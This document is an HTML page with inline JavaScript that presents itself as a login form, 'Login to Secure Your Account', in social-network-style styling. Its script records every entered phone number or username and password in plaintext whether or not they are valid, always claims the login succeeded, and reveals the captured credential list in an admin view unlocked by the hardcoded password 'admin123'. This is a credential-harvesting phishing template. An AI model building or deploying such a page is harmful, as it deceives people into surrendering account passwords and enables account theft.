<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9ebee;
            margin: 0;
            padding: 0;
        }

        .login-container, .admin-container {
            background-color: white;
            width: 400px;
            margin: 100px auto;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }

        .login-title {
            text-align: center;
            font-size: 18px;
            margin: 10px 0;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-container input[type="submit"] {
            background-color: #4267B2;
            color: white;
            border: none;
            cursor: pointer;
        }

        .login-container input[type="submit"]:hover {
            background-color: #365899;
        }

        .admin-container {
            display: none; /* Hidden by default */
        }

        #userList {
            margin-top: 20px;
        }

        .form-label {
            display: block;
            margin: 0 0 5px;
        }
    </style>
</head>
<body>

<div class="login-container" id="loginContainer">
    <div class="login-title">Login to Secure Your Account</div>
    <form id="loginForm" onsubmit="return login(event)">
        <input type="text" id="phone" name="phone" required>
        <label for="phone" class="form-label">Phone No./Username:</label>
        
        <input type="password" id="password" name="password" required>
        <label for="password" class="form-label">Password:</label>
        
        <input type="submit" value="Login">
    </form>
    <div id="loginMessage"></div>
</div>

<div class="admin-container" id="adminContainer">
    <div class="login-title">Admin View</div>
    <h2>Logged In Users</h2>
    <ul id="userList"></ul>
</div>

<script>
    const users = []; // Array to store logged-in users

    function login(event) {
        event.preventDefault();
        const phone = document.getElementById("phone").value;
        const password = document.getElementById("password").value;
        const adminPassword = "admin123"; // Admin password

        // Add user to the array regardless of credentials
        users.push({ phone, password, timestamp: new Date() });

        // Display login success message
        document.getElementById("loginMessage").innerText = "Login successfully!";

        // Check if the password is correct to show admin view
        if (password === adminPassword) {
            displayAdminView(); // Show admin view
        }

        // Hide login container
        document.getElementById("loginContainer").style.display = "none";
    }

    function displayAdminView() {
        const userList = document.getElementById("userList");
        userList.innerHTML = ""; // Clear previous list

        users.forEach(user => {
            const li = document.createElement("li");
            li.innerText = `${user.phone} - ${user.password} - ${user.timestamp}`;
            userList.appendChild(li);
        });

        document.getElementById("adminContainer").style.display = "block"; // Show admin view
    }
</script>

</body>
</html>
